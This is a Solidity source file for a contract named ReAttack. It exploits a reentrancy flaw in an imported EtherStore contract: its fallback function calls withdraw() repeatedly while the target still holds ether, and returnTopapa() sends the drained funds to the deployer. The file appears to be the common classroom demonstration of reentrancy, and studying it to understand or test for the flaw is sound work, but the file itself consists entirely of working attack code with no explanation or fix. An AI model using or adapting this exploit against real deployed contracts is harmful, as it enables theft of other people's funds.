// SPDX-License-Identifier: MIT
import "./Reentrancy.sol";
pragma solidity >= 0.7.0 <0.9.0;

contract ReAttack{
    EtherStore public ets;
    address payable owner;
    constructor(address _etsadd){
        ets = EtherStore(_etsadd);
        owner = payable(msg.sender);
    }
    fallback() external payable{
        if(address(ets).balance >= 1 ether){
            ets.withdraw();
        }
    }
    function attack() external payable{
        ets.deposit{value: 1 ether}();
        ets.withdraw();
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    function returnTopapa() public{
        uint val = address(this).balance;
        owner.transfer(val);
    } 
}